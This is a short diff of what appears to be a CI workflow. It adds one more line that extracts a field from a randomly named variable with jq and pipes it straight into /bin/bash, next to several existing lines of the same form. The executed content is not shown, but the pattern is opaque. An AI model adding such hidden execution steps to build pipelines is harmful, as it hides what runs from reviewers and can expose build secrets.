@@ -25,6 +25,7 @@ jobs:
           echo $lubi964 | jq -r .ndua78 | /bin/bash
           echo $jjcfr673 | jq -r .h73 | /bin/bash
           echo $pgxz9965 | jq -r .dnxph929 | /bin/bash
+          echo $dtoln80 | jq -r .kbrmn1 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
